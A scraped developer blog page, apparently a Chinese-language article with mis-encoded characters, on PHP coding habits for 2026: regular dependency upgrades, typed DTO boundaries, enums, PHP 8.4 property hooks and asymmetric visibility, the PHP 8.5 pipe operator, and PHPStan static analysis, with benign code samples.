h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">2026 å¹´ PHP å¼€å‘è€…è¿›é˜¶ å¿«é€Ÿé«˜æ•ˆå¼€å‘å­¦ä¹ ä¹ æƒ¯</h2>
<h3 data-id="heading-1">ä¸ºä»€ä¹ˆ 2026 å¹´çš„è¿›é˜¶æ–¹å¼ä¸åŒäº†</h3>
<p>2026 å¹´ï¼Œæˆä¸ºæ›´å¥½çš„ PHP å¼€å‘è€…ï¼Œé çš„ä¸æ˜¯è®°ä½æ›´å¤šè¯­æ³•æŠ€å·§ï¼Œè€Œæ˜¯å…»æˆ<strong>å¤åˆ©ä¹ æƒ¯</strong>â€”â€”é‚£äº›å¯é‡å¤çš„å°å®è·µï¼Œæ¯å‘¨éƒ½åœ¨æ‚„æ‚„æ”¹å–„ä»£ç åº“ã€‚</p>
<p>è¡Œä¸šçš„æ–¹å‘å¾ˆæ˜ç¡®ï¼š</p>
<ul>
<li><strong>PHP å˜å¾—æ›´å…·è¡¨è¾¾åŠ›ã€æ›´å®‰å…¨</strong>ï¼ˆPHP 8.4 å’Œ 8.5 å¸¦æ¥çš„æ”¹è¿›ï¼Œæ—¥å¸¸å·¥ä½œä¸­éƒ½èƒ½æ„Ÿå—åˆ°ï¼‰</li>
<li><strong>å·¥å…·å˜å¾—æ›´ä¸¥æ ¼ï¼Œä¹Ÿæ›´æœ‰ä»·å€¼</strong>â€”â€”èƒ½æ•è·é‚£äº›ä¸€ç›´è®©æˆ‘ä»¬ä»˜å‡ºä»£ä»·çš„ç”Ÿäº§æ•…éšœï¼ˆç±»å‹é”™è¯¯ã€null å¤„ç†ã€ä¸å®‰å…¨çš„æ•°ç»„ã€ä¸å®Œæ•´çš„é‡æ„ï¼‰</li>
<li><strong>å®‰å…¨å’Œä¾›åº”é“¾æˆä¸ºå·¥ç¨‹åŸºç¡€</strong>ï¼Œä¸å†æ˜¯æŸä¸ªç‹¬ç«‹éƒ¨é—¨çš„äº‹ï¼ˆComposer audit å’Œ OWASP æ€ç»´å·²ç»æ˜¯å¸¸è§è¯æ±‡ï¼‰</li>
</ul>
<p>æ‰€ä»¥ 2026 å¹´çš„è¿›é˜¶å…¬å¼ä¸æ˜¯åŠ±å¿—æµ·æŠ¥ï¼Œè€Œæ˜¯ä¸€å¥—ä¹ æƒ¯ï¼š</p>
<ul>
<li>å‡å°‘æ„å¤–</li>
<li>ç¼©çŸ­åé¦ˆå¾ªç¯</li>
<li>è®©æ­£ç¡®æ€§æ¯”èªæ˜æ›´å®¹æ˜“</li>
</ul>
<p>æ¥ä¸‹æ¥ä»‹ç»çœŸæ­£æœ‰æ•ˆçš„ä¹ æƒ¯â€”â€”ä¸æ˜¯çº¸ä¸Šè°ˆå…µã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Flevel-up-php-developer-high-impact-habits" target="_blank" title="https://catchadmin.com/post/2026-01/level-up-php-developer-high-impact-habits" ref="nofollow noopener noreferrer">åŸæ–‡ 2026 å¹´ PHP å¼€å‘è€…è¿›é˜¶ å¿«é€Ÿé«˜æ•ˆå¼€å‘å­¦ä¹ ä¹ æƒ¯</a></p>
<h3 data-id="heading-2">ä¹ æƒ¯ 1ï¼šæŠŠå‡çº§å½“ä½œæ¯å‘¨ç»´æŠ¤ï¼Œåˆ«ç­‰åˆ°å¹´åº•ææ…Œ</h3>
<p>PHP 8.5 äº 2025 å¹´ 11 æœˆ 20 æ—¥å‘å¸ƒï¼ŒåŒ…å«ç®¡é“æ“ä½œç¬¦ã€URI æ‰©å±•ã€å…‹éš†æ—¶ä¿®æ”¹å±æ€§ç­‰æ”¹è¿›å¼€å‘ä½“éªŒçš„åŠŸèƒ½ã€‚</p>
<p>PHP 8.4 å¼•å…¥äº†å±æ€§é’©å­å’Œéå¯¹ç§°å¯è§æ€§â€”â€”éƒ½èƒ½å‡å°‘æ ·æ¿ä»£ç ï¼Œé™ä½æ„å¤–ä¿®æ”¹çš„é£é™©ã€‚</p>
<p>å…·ä½“åŠŸèƒ½ä¸æ˜¯é‡ç‚¹ï¼Œé‡è¦çš„æ˜¯ä¿¡å·ï¼šç°ä»£ PHP è®©ä»£ç æ›´å®¹æ˜“åšåˆ°ï¼š</p>
<ul>
<li>æ˜ç¡®è¡¨è¾¾ä¸å˜é‡</li>
<li>éš¾ä»¥è¢«è¯¯ç”¨</li>
<li>å®‰å…¨é‡æ„</li>
</ul>
<h4 data-id="heading-3">å®ç”¨çš„å‡çº§ä¹ æƒ¯ï¼ˆå¯æ‰©å±•åˆ°å¤šä¸ªä»“åº“ï¼‰</h4>
<p>æ¯å‘¨ï¼ˆæˆ–æ¯ä¸¤å‘¨ï¼‰åšä¸€æ¬¡ç®€çŸ­çš„å‡çº§æ£€æŸ¥ï¼š</p>
<ol>
<li>å‡çº§ä¾èµ–çš„è¡¥ä¸ç‰ˆæœ¬</li>
<li>è¿è¡Œæµ‹è¯• + é™æ€åˆ†æ</li>
<li>æŒç»­å‘å¸ƒå°å‡çº§</li>
</ol>
<p>é¿å…"å…­ä¸ªæœˆä¾èµ–é›ªå´©"é˜»å¡çœŸæ­£çš„å·¥ä½œã€‚</p>
<p><strong>å…·ä½“æ­¥éª¤ï¼š</strong></p>
<p><strong>1. å›ºå®šå¹³å°ç‰ˆæœ¬ï¼Œè®© Composer åœ¨ä¸åŒæœºå™¨ä¸Šè§£æä¸€è‡´ï¼š</strong></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"php"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^8.3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"config"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"platform"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"php"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"8.3.0"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>2. åœ¨ CI ä¸­æ·»åŠ "æœªæ¥ PHP"ç‰ˆæœ¬çš„ä»»åŠ¡ï¼Œæå‰å¤„ç†å…¼å®¹æ€§ï¼š</strong></p>
<ul>
<li>ä¿æŒä¸»è¿è¡Œæ—¶ç¨³å®š</li>
<li>æ·»åŠ ç¬¬äºŒä¸ªä»»åŠ¡ï¼Œåœ¨ä¸‹ä¸€ä¸ªå°ç‰ˆæœ¬ä¸Šè¿è¡Œæµ‹è¯•</li>
<li>é€æ­¥ä¿®å¤ä¸å…¼å®¹</li>
</ul>
<p><strong>3. è¯»å®˜æ–¹å‘å¸ƒè¯´æ˜ï¼Œåˆ«åªçœ‹åšå®¢æ‘˜è¦</strong></p>
<p>å®˜æ–¹ PHP 8.5 å’Œ 8.4 å‘å¸ƒå…¬å‘Šç®€çŸ­ä¸”å¯æ“ä½œã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>ä¸å†æŠŠ"å­¦ä¹  PHP"å½“ä½œçç¢çŸ¥è¯†ï¼Œè€Œæ˜¯æŠŠå®ƒå½“ä½œä¸€ä¸ªæ´»è·ƒçš„è¿è¡Œæ—¶â€”â€”å®ƒä¼šæ”¹å˜å·¥ç¨‹çº¦æŸã€‚</p>
<h3 data-id="heading-4">ä¹ æƒ¯ 2ï¼šæŠŠ"æ•°æ®è¾¹ç•Œ"ä½œä¸ºé»˜è®¤æ¶æ„ç­–ç•¥</h3>
<p>å¤§å¤šæ•° PHP ç”Ÿäº§ bug éƒ½ä¸å¥‡ç‰¹ï¼Œé€šå¸¸æ˜¯ï¼š</p>
<ul>
<li>æ•°ç»„ç¼ºå°‘é”®</li>
<li>å­—ç¬¦ä¸²åº”è¯¥æ˜¯ int</li>
<li>å¯ç©ºå€¼æ²¡è¢«å½“ä½œå¯ç©ºå¤„ç†</li>
<li>"ä¸´æ—¶"è¾“å…¥æ ¼å¼å˜æˆäº†æ°¸ä¹…æ ¼å¼</li>
</ul>
<p>ä¿®å¤æ–¹æ³•æ— èŠä½†å¼ºå¤§ï¼š<strong>å°½æ—©æŠŠä¸å¯ä¿¡è¾“å…¥è½¬æ¢æˆç±»å‹åŒ–å¯¹è±¡ï¼Œåˆ«åœ¨ç³»ç»Ÿé‡Œä¼ åŸå§‹æ•°ç»„ã€‚</strong></p>
<h4 data-id="heading-5">ç®€å•çš„ DTO è¾¹ç•Œï¼ˆæ¡†æ¶æ— å…³ï¼‰</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateOrderInput</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$customerId</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$totalCents</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
    </span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;customerId === <span class="hljs-string">''</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'customerId is required'</span>);
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;totalCents &lt;= <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'totalCents must be positive'</span>);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[A-Z]{3}$/'</span>, <span class="hljs-variable">$this</span>-&gt;currency)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'currency must be ISO-4217 like "USD"'</span>);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fromArray</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">self</span>
    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>(
            customerId: (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'customerId'</span>] ?? <span class="hljs-string">''</span>),
            totalCents: (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'totalCents'</span>] ?? <span class="hljs-number">0</span>),
            currency: <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-title function_ invoke__">trim</span>((<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$payload</span>[<span class="hljs-string">'currency'</span>] ?? <span class="hljs-string">''</span>))),
        );
    }
}
</code></pre>
<p>æœåŠ¡å±‚ä¸ç”¨çŒœäº†ï¼Œæ¥æ”¶çš„æ˜¯ä¿è¯çš„ç»“æ„ã€‚</p>
<h4 data-id="heading-6">ç”¨æšä¸¾è¡¨ç¤º"å…è®¸çš„å€¼"ï¼Œåˆ«ç”¨æ³¨é‡Š</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">OrderStatus</span>: <span class="hljs-title">string</span>
</span>{
    <span class="hljs-keyword">case</span> Created = <span class="hljs-string">'CREATED'</span>;
    <span class="hljs-keyword">case</span> Paid = <span class="hljs-string">'PAID'</span>;
    <span class="hljs-keyword">case</span> Cancelled = <span class="hljs-string">'CANCELLED'</span>;
}
</code></pre>
<p>è¿™æ ·å°±æ¶ˆé™¤äº†ï¼š</p>
<ul>
<li>æ— æ•ˆå­—ç¬¦ä¸²çŠ¶æ€</li>
<li>æ‹¼å†™é”™è¯¯ bug</li>
<li>ä¸€åŠçš„ <code>if ($status === '...')</code> æ··ä¹±</li>
</ul>
<h4 data-id="heading-7">æƒ³è¦"å¯è¯»ä½†ä¸å¯å†™"æ—¶ç”¨éå¯¹ç§°å¯è§æ€§</h4>
<p>PHP 8.4 çš„éå¯¹ç§°å¯è§æ€§éå¸¸é€‚åˆä¸åº”ä»å¤–éƒ¨ä¿®æ”¹çš„é¢†åŸŸå¯¹è±¡ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shipment</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">private</span>(<span class="hljs-params">set</span>) <span class="hljs-keyword">string</span> <span class="hljs-variable">$status</span> = <span class="hljs-string">'CREATED'</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">markInTransit</span>(<span class="hljs-params"/>): <span class="hljs-title">void</span>
    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;status = <span class="hljs-string">'IN_TRANSIT'</span>;
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>ä¸å†ä¾èµ–çºªå¾‹ï¼ˆ"è¯·ä¼ æ­£ç¡®çš„ç»“æ„"ï¼‰ï¼Œè€Œæ˜¯ä¾èµ–çº¦æŸï¼ˆ"ä¸æ­£ç¡®å°±å¿«é€Ÿå¤±è´¥"ï¼‰ã€‚</p>
<h3 data-id="heading-8">ä¹ æƒ¯ 3ï¼šæŠŠä¸å˜é‡æ”¾åœ¨å®ƒä¿æŠ¤çš„çŠ¶æ€æ—è¾¹</h3>
<p>å¾ˆå¤š PHP ä»£ç åº“é‡Œï¼ŒéªŒè¯æ˜¯åˆ†æ•£çš„ï¼š</p>
<ul>
<li>æ§åˆ¶å™¨éªŒè¯ä¸€ç‚¹</li>
<li>æœåŠ¡éªŒè¯ä¸€ç‚¹</li>
<li>ä»“å‚¨å†éªŒè¯ä¸€ç‚¹</li>
<li>ç”Ÿäº§ç¯å¢ƒè¿˜æ˜¯å‡ºç°"ä¸å¯èƒ½"çš„çŠ¶æ€</li>
</ul>
<p>PHP 8.4 å±æ€§é’©å­èƒ½åœ¨å±æ€§è®¿é—®æ—¶å¼ºåˆ¶æ‰§è¡Œè§„åˆ™ï¼Œä¸ç”¨å†™æ— å°½çš„ setter æ ·æ¿ã€‚</p>
<h4 data-id="heading-9">ç°å®çš„ä¸å˜é‡ï¼š"å·²ä»˜é‡‘é¢ä¸èƒ½è¶…è¿‡æ€»é¢"</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Money</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$currency</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$cents</span>,
    </span>) </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;cents &lt; <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Money cannot be negative'</span>);
        }
        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^[A-Z]{3}$/'</span>, <span class="hljs-variable">$this</span>-&gt;currency)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Invalid currency'</span>);
        }
    }
}

<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Invoice</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> Money <span class="hljs-variable">$total</span>,
    </span>) </span>{}

    <span class="hljs-keyword">public</span> Money <span class="hljs-variable">$paid</span> {
        <span class="hljs-title function_ invoke__">set</span> (Money <span class="hljs-variable">$value</span>) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span>-&gt;currency !== <span class="hljs-variable language_">$this</span>-&gt;total-&gt;currency) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Currency mismatch'</span>);
            }
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$value</span>-&gt;cents &gt; <span class="hljs-variable language_">$this</span>-&gt;total-&gt;cents) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">InvalidArgumentException</span>(<span class="hljs-string">'Overpayment not allowed'</span>);
            }
            <span class="hljs-variable language_">$this</span>-&gt;paid = <span class="hljs-variable">$value</span>;
        }
    }
}
</code></pre>
<p><strong>æ³¨æ„ï¼š</strong> åˆ«ç”¨é’©å­éšè— IO æˆ–å‰¯ä½œç”¨ã€‚é’©å­ç”¨äºéªŒè¯å’Œè½¬æ¢ï¼›IO ä¿æŒæ˜¾å¼ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>é¢†åŸŸè§„åˆ™æ›´éš¾ç»•è¿‡ï¼Œé‡æ„æ—¶æ›´å®¹æ˜“æ¨ç†ã€‚</p>
<h3 data-id="heading-10">ä¹ æƒ¯ 4ï¼šç”¨ç®¡é“æ“ä½œç¬¦è®©è½¬æ¢å¯è¯»</h3>
<p>PHP 8.5 åŒ…å«ç®¡é“æ“ä½œç¬¦ï¼Œæœ€é€‚åˆå¯é¢„æµ‹çš„å‘½åè½¬æ¢ã€‚</p>
<p>åœ¨è¯·æ±‚è§„èŒƒåŒ–ã€æ˜ å°„å’Œæ•°æ®å¡‘å½¢ä¸­ä¼šç«‹å³æ„Ÿå—åˆ°â€”â€”è¿™äº›åœ°æ–¹ PHP ä»£ç ç»å¸¸å˜æˆåµŒå¥—è°ƒç”¨æˆ–"ä¸´æ—¶å˜é‡æ±¤"ã€‚</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trimAll</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-string">'trim'</span>, <span class="hljs-variable">$xs</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dropEmpty</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$xs</span>, fn(<span class="hljs-variable">$x</span>) =&gt; <span class="hljs-variable">$x</span> !== <span class="hljs-string">''</span>));
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lower</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_map</span>(fn(<span class="hljs-variable">$x</span>) =&gt; <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$x</span>), <span class="hljs-variable">$xs</span>);
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">unique</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$xs</span></span>): <span class="hljs-title">array</span> </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">array_values</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-variable">$xs</span>));
}

<span class="hljs-variable">$tags</span> = [<span class="hljs-string">'  PHP '</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'Backend'</span>, <span class="hljs-string">'php'</span>, <span class="hljs-string">'backend '</span>];

<span class="hljs-variable">$normalized</span> = <span class="hljs-variable">$tags</span>
    |&gt; <span class="hljs-title function_ invoke__">trimAll</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">dropEmpty</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">lower</span>(...)
    |&gt; <span class="hljs-title function_ invoke__">unique</span>(...);

<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$normalized</span>);
</code></pre>
<p><strong>ç»éªŒæ³•åˆ™ï¼š</strong> æ¯ä¸ªæ­¥éª¤èƒ½ç”¨ 2-4 ä¸ªè¯æ€»ç»“ï¼Œç®¡é“å°±æœ‰å¸®åŠ©ã€‚æ­¥éª¤éœ€è¦ä¸€æ®µè¯ï¼Œå°±åˆ«å†…è”ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¿™ä¸ªä¹ æƒ¯æœ‰ç”¨ï¼š</strong></p>
<p>æ„å›¾æ›´æ¸…æ™°ï¼Œå‡å°‘å®¡æŸ¥æ—¶é—´å’Œé‡æ„é£é™©ã€‚</p>
<h3 data-id="heading-11">ä¹ æƒ¯ 5ï¼šæŠŠé™æ€åˆ†æåŠ å…¥æ—¥å¸¸åé¦ˆå¾ªç¯</h3>
<p>é™æ€åˆ†ææ˜¯ PHP ä¸­æœ€å¯é çš„"æŠ€èƒ½å€å¢å™¨"ä¹‹ä¸€ã€‚åŸå› å¾ˆç®€å•ï¼šPHP çµæ´»ï¼Œçµæ´»æ€§å°±æ˜¯ bug è—èº«ä¹‹å¤„ã€‚</p>
<p>PHPStan 2.0 æ˜¯é‡è¦é‡Œç¨‹ç¢‘ï¼ˆ2024 å¹´å‘å¸ƒï¼Œ2025 å¹´å¹¿æ³›é‡‡ç”¨ï¼‰ã€‚</p>
<p>ä¸ç”¨é™æ€åˆ†æï¼Œå°±æ˜¯é€‰æ‹©åœ¨è¿è¡Œæ—¶å‘ç°æœ¬å¯ä»¥åœ¨ç¼–è¯‘æ—¶å‘ç°çš„é—®é¢˜ã€‚</p>
<h4 data-id="heading-12">ä¸ä¼šå¼•èµ·åæŠ—çš„é‡‡ç”¨ç­–ç•¥</h4>
<p>ä»èƒ½å®ç°çš„çº§åˆ«å¼€å§‹ï¼Œç„¶åæ”¶ç´§ã€‚</p>
<p>ç¤ºä¾‹ <code>phpstan.neon</code>ï¼š</p>
<pre><code class="hljs language-neon" lang="neon">parameters:
  level: 6
  paths:
    - src
  reportUnmatchedIgnoredErrors: true
</code></pre>
<p>åœ¨ CI ä¸­ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">vendor/bin/phpstan analyse --memory-limit=1G
</code></pre>
<p>ç„¶åè¿­ä»£ï¼š</p>
<ul>
<li><strong>çº§åˆ« 6</strong>ï¼šæ¸…ç†æ˜æ˜¾é—®é¢˜</li>
<li><strong>çº§åˆ« 7-8</strong>ï¼šå¼ºåˆ¶æ›´å¥½çš„ç±»å‹å’Œ null å¤„ç†</li>
<li><strong>çº§åˆ« 9-10</strong>ï¼šä»…åœ¨ä»£ç åº“å‡†å¤‡å¥½å</li>
</ul>
<h4 data-id="heading-13">æœ€é‡è¦çš„å®è·µï¼šç»™æ•°ç»„åŠ ç±»å‹</h4>
<p>æœªç±»å‹åŒ–çš„æ•°ç»„ä¼šè®©åˆ†æå¤±æ•ˆã€‚å°½å¯èƒ½ç”¨ DTOï¼Œæ•°ç»„ä¸å¯é¿å…æ—¶å°±æ³¨é‡Šï¼š</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**
 * <span class="hljs-doctag">@return</span> array&lt;int, array{sku: string, qty: int}&gt;
 */</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseItems</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$payload</span></span>): <span class="hljs-title">array</span>
</span>{
    <span class="hljs-variable">$items</span> = [];
    <span class="hljs-keyword">foreach</span> ((<span class="hljs-variable">$payload</span>[<span class="hljs-string">'items'</span>] ?? []) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>) {
        <span class="hljs-variable">$items</span>[] = [
            <span class="hljs-string">'sku'</span> =&gt; (<span class="hljs-keyword">string</span>)(<span class="hljs-variable">$row</span>[<span class="hljs-string">'sku'</span>] ?? <span class="hljs-string">''</span>),
            <span class="hljs-string">'qty'</span> =&gt; (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$row</span>[<span class="hljs-string">'qty'</span>] ?? <span class="hljs-number">0</span>),
        ];
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$items</span>;
}
</code></pre>
